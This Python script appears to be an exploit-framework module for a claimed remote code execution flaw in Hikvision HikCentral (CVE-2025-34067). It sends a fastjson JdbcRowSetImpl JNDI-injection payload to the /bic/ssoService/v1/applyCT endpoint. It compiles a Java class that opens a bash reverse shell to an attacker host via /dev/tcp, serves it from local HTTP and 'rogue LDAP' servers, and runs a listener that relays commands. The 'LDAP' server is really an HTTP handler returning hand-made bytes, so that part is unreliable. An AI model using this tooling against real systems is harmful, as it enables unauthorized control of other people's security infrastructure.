#!/usr/bin/env python3
# File: modules/exploits/hikvision_applyct_exploit.py

import http.server
import socketserver
import threading
import argparse
import base64
import subprocess
import requests
import json
import os
import socket
import time
from pathlib import Path

# Config
LDAP_PORT = 1389
HTTP_PORT = 8000
SHELL_PORT = 4444
CLASS_NAME = "Exploit"
CLASS_FILE = f"{CLASS_NAME}.class"
PAYLOAD_DIR = Path("payloads")
CLASS_PATH = PAYLOAD_DIR / CLASS_FILE

# Reverse Shell Payload (Linux Bash)
JAVA_CODE = f"""
public class {CLASS_NAME} {{
    static {{
        try {{
            String[] cmd = {{"/bin/bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/SHELL_PORT 0>&1"}};
            Runtime.getRuntime().exec(cmd);
        }} catch (Exception e) {{
            e.printStackTrace();
        }}
    }}
}}
"""

# ---------- LDAP Rogue Server ----------
class RogueLDAPHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "application/x-java-serialized-object")
        self.end_headers()
        payload = (
            b'\xac\xed\x00\x05sr\x00\x11javax.naming.Reference'
            b'\x5b\x81\xcb\xec\x02\x00\x03L\x00\x04addr'
            b't\x00\x13Ljava/lang/Object;L\x00\x08classNamet\x00\x12Ljava/lang/String;'
            b'L\x00\x0bclassFactoryt\x00\x12Ljava/lang/String;xppt\x00\x07Exploit'
            b't\x00\x04Explt\x00\x04Expl'
        )
        self.wfile.write(payload)

def start_ldap_server():
    with socketserver.TCPServer(("", LDAP_PORT), RogueLDAPHandler) as httpd:
        print(f"[+] Rogue LDAP server running on port {LDAP_PORT}")
        httpd.serve_forever()

# ---------- HTTP Server for Java Class ----------
def start_http_server():
    os.chdir(str(PAYLOAD_DIR))
    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", HTTP_PORT), handler) as httpd:
        print(f"[+] HTTP server serving payload on port {HTTP_PORT}")
        httpd.serve_forever()

# ---------- Reverse Shell Listener ----------
def start_shell_listener():
    print(f"[+] Listening for reverse shell on port {SHELL_PORT} ...")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('', SHELL_PORT))
        s.listen(1)
        conn, addr = s.accept()
        print(f"[+] Connection from {addr[0]}")
        while True:
            try:
                cmd = input("$ ")
                if cmd.strip() == "exit":
                    break
                conn.sendall((cmd + "\n").encode())
                data = conn.recv(4096)
                print(data.decode(errors='ignore'), end='')
            except KeyboardInterrupt:
                break
        conn.close()

# ---------- Java Compilation ----------
def generate_payload(attacker_ip):
    PAYLOAD_DIR.mkdir(exist_ok=True)
    java_file = PAYLOAD_DIR / f"{CLASS_NAME}.java"
    print(f"[+] Writing Java payload to: {java_file}")
    java_code = JAVA_CODE.replace("ATTACKER_IP", attacker_ip).replace("SHELL_PORT", str(SHELL_PORT))
    with open(java_file, "w") as f:
        f.write(java_code)
    print("[+] Compiling Java class...")
    subprocess.run(["javac", str(java_file)], check=True)
    if not CLASS_PATH.exists():
        print("[-] Java class compilation failed.")
        exit(1)
    print(f"[+] Compiled Java payload: {CLASS_PATH}")

# ---------- Exploit Sender ----------
def send_exploit(target_url, attacker_ip):
    full_url = f"{target_url}/bic/ssoService/v1/applyCT"
    ldap_url = f"ldap://{attacker_ip}:{LDAP_PORT}/Exploit"
    payload = {
        "data": {
            "@type": "com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName": ldap_url,
            "autoCommit": True
        }
    }
    headers = {"Content-Type": "application/json"}

    print(f"[+] Sending exploit to: {full_url}")
    try:
        response = requests.post(full_url, headers=headers, data=json.dumps(payload), timeout=10, verify=False)
        print(f"[+] Target responded: {response.status_code}")
    except Exception as e:
        print(f"[-] Exploit failed: {e}")

# ---------- Main ----------
def main():
    parser = argparse.ArgumentParser(description="CVE-2025-34067 - Hikvision HikCentral RCE Full Exploit w/ Listener")
    parser.add_argument("--target", required=True, help="Target URL (e.g. http://192.168.1.50:8080)")
    parser.add_argument("--attacker-ip", required=True, help="Attacker IP for callback, LDAP & HTTP servers")
    args = parser.parse_args()

    generate_payload(args.attacker_ip)

    # Start rogue servers
    threading.Thread(target=start_http_server, daemon=True).start()
    threading.Thread(target=start_ldap_server, daemon=True).start()
    threading.Thread(target=start_shell_listener, daemon=True).start()

    time.sleep(3)
    send_exploit(args.target, args.attacker_ip)

    print("[*] Exploit sent. Waiting for shell... Press Ctrl+C to exit.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Exploit stopped.")

if __name__ == "__main__":
    main()
